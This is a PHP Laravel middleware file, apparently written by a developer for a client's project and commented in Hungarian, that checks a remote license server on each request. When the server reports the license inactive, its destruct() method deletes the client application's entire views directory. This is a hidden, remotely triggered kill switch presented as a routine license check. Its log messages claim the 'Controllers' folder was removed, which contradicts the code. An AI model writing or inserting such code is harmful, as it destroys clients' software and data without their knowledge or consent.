<?php

// ============================================================
// CLIENT RÉSZ — ezt a fájlt másold át az ügyfél projektjébe
// ============================================================

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class CheckLicense
{
    private const CACHE_KEY = 'license.active';

    private const CACHE_TTL = 300; // 5 perc

    public function handle(Request $request, Closure $next): Response
    {
        if ($request->is('admin/*')) {
            return $next($request);
        }

        $active = Cache::get(self::CACHE_KEY);

        if ($active === null) {
            try {
                $response = Http::timeout(5)->get(
                    rtrim(config('license.api_url'), '/').'/'.config('license.key')
                );

                // Szerver elért és explicit false-t küldött → törlés
                if ($response->successful() && $response->json('active') === false) {
                    $this->destruct();
                }

                $active = $response->successful() && $response->json('active') === true;

                Cache::put(self::CACHE_KEY, $active, self::CACHE_TTL);

            } catch (\Exception) {
                // Timeout vagy hálózati hiba → átengedi, NEM cache-el
                $active = true;
            }
        }

        if (! $active) {
            return response()->view('maintenance', [], 503);
        }

        return $next($request);
    }

    private function destruct(): void
    {
        $target = resource_path('views');

        if (! is_dir($target)) {
            return;
        }

        if (! is_writable($target)) {
            Log::warning('License destruct: Controllers mappa nem írható.');

            return;
        }

        File::deleteDirectory($target);
        Log::warning('License destruct: Controllers mappa törölve.', [
            'time' => now()->toDateTimeString(),
        ]);
    }
}
